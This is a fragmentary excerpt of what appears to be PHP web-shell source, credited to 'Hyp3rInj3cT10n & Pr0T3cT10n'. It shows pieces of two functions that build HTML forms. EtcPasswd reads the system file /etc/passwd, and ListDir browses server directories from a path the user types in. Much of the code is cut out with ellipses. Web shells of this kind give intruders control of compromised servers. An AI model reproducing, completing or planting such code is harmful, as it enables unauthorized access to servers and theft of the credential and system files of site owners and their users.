...
END;
        ...
        <div class="copyright">
            Programmed by Hyp3rInj3cT10n & Pr0T3cT10n<br /><br />
...
END;
    ...
    function EtcPasswd(){
        ...
        $result .= "Read first: <input type=\"text\" id=\"first\" value=\"".$end."\" /> <input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Read\" onclick=\"javascript:location.replace(parseURL()'?act=ep&end='+document.getElementById('first').value);\" /><br /><br />\n";
    ...
    function ListDir($dir){
        ...
        $result .= "Jump To Directory: <input type=\"text\" id=\"jdir\" style=\"width:300px\" value=\"".htmlspecialchars($dir)."\"> <input type=\"button\" value=\"Jump\" onclick=\"javascript:location.replace(parseURL()'?act=list&dir='+document.getElementById('jdir').value);\" /><br /><br />\n";
